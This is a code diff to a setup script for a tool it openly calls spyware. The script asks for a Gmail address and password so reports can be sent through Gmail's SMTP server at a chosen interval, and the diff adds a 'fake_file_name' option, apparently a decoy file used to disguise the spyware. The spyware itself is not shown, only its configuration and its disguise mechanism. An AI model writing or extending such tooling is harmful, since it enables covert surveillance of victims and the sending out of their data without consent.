@@ -5,11 +5,12 @@ from pyfiglet import figlet_format
 import re
 
 
-def create_file(email, password, report_period):
+def create_file(email, password, report_period, fake_file_name):
     info = {
         'email': email,
         'password': password,
-        'frequency': report_period
+        'frequency': report_period,
+        'fake_file_name': fake_file_name
     }
 
     if not os.path.isdir('./user_info'):
@@ -23,21 +24,20 @@ def create_file(email, password, report_period):
     print('[+] Created ./user_info/info.json file')
 
 
-def get_email():
-    regex = '[A-Za-z0-9\.\+_]+@gmail\.com'
+def validate_input(regex, input_question, error_message):
     result = True
 
     while result:
-        email = input('Email: ')
-        match = re.search(regex, email)
+        user_input = input(input_question)
+        match = re.search(regex, user_input)
 
         try:
             match.group()
             result = False
-            return email
+            return user_input
 
         except AttributeError:
-            print('Wrong email!\n')
+            print(error_message)
 
 
 def main():
@@ -48,12 +48,13 @@ def main():
     print('===============================================================\n')
     print('You\'ll need gmail account to process (program uses their SMTP server)')
 
-    email = get_email()
+    email = validate_input('[A-Za-z0-9\.\+_]+@gmail\.com', 'Email: ', 'Wrong email!\n')
 
     passwword = input('Password: ')
     report_period = input('Input frequency of reports (in seconds): ')
+    fake_file_name = validate_input('.+\.[A-Za-z]{1,5}', 'Input name of the fake file (with extension; it should be in /fake_file directory): ', 'Wrong name of file!\n')
 
-    create_file(email, passwword, report_period)
+    create_file(email, passwword, report_period, fake_file_name)
 
     print(colored('\nOk, we\'re set, now run spyware.py file', color='yellow'))
 
